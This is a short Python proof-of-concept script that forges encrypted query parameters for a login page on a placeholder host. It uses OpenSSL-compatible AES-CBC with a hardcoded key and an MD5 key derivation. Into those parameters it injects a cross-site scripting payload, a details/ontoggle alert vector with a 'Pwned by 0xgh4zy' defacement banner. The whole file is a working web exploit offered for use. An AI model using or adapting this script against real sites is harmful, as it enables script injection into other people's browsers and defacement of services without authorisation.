from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import hashlib

KEY = "The-Secret-Value"


def enc(value):
    salt = get_random_bytes(8)

    key_iv = hashlib.md5(
        
        KEY.encode("utf-8") + salt
    ).digest()

    while len(key_iv) < 48:
        key_iv += hashlib.md5(
            key_iv[-16:] + KEY.encode("utf-8") + salt
        ).digest()

    key = key_iv[:32]
    iv = key_iv[32:48]

    data = value.encode("utf-8")
    padding = AES.block_size - len(data) % AES.block_size
    data += bytes([padding]) * padding

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(data)

    openssl_data = b"Salted__" + salt + ciphertext

    return base64.b64decode(
        base64.b64encode(openssl_data)
    ).hex()


payload = (
    '<details open ontoggle="alert(\'Pwned by 0xgh4zy\')">'
    "<h2 style='color:red'>Pwned by 0xgh4zy</h2></details>"
)

url = (
    "https://www.target.com/login/?"
    f"{enc('msg')}={enc(payload)}"
    f"&{enc('type')}={enc('error')}"
)

print(url)
